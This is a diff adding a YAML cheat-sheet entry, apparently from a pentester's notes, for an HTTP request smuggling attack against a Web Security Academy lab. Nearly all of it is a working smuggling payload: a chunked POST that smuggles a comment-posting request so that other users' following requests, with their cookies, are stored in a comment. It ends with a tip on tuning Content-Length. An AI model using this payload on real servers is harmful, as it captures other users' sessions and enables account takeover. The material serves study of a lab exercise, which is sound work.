@@ -1,0 +1,25 @@
+name: Request Smuggling Capturing other users requests
+description:
+commands:
+  - command: |
+      POST / HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+      Transfer-Encoding: chunked
+      Content-Length: 354
+
+      0
+
+      POST /post/comment HTTP/1.1
+      Host: 0a3b00ed0402b2df8324140a00cf0046.web-security-academy.net
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: session=6Jd83sI6vELILMHylDDghwQHmP1E1GPG
+      Content-Length: 950
+      csrf=d1Pulb3OID1cikuQ7DP3eCvYCRrPm4vx&postId=9&name=%3Ch5%3EAesir%3C%2Fh5%3E&email=hi%40hi.com&website=http%3A%2F%2Fqc027bl9&comment=
+    description: Verify how CSRF works, in this case CSRF token is linked to the session. Update Content-Length based on response, if the requests timeouts, decrease the number.
+tags:
+  - http-request-smuggling
+show:
+links:
+  -
+references:
+  -
